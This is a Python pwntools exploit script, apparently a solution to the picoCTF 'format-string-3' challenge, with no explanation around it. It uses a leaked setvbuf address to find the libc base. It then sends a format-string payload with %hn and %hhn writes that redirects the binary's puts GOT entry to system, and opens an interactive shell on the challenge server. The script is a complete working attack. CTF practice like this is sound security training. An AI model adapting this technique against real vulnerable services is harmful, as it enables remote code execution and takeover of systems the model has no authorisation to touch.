#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "info"

chall = "./format-string-3"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("rhea.picoctf.net", 60799)
elif len(argv) >= 2 and argv[1] == "d":
    cmd = """
    	b *main+160
    	c
    """
    p = gdb.debug(chall,cmd)
else:
    p = process(chall)


p.recvuntil(b"libc: ")
leak = eval(p.recvline().rstrip())
libc_base = leak - libc.symbols["setvbuf"]
libc.address = libc_base
log.info("libc base: " + hex(libc_base))
libc_system_addr = libc.symbols["system"]
log.info("system@libc: " + hex(libc_system_addr))


payload = "%{}c%42$hn".format(int(libc_system_addr & 0xffff)).encode()
payload += "%{}c%43$hhn".format(int((libc_system_addr >> 16) & 0xff) - 96).encode()
payload += b'A' * (8 - (len(payload) % 8))
payload += p64(elf.got["puts"])
payload += p64(elf.got["puts"] + 2)


p.sendline(payload)

p.interactive()
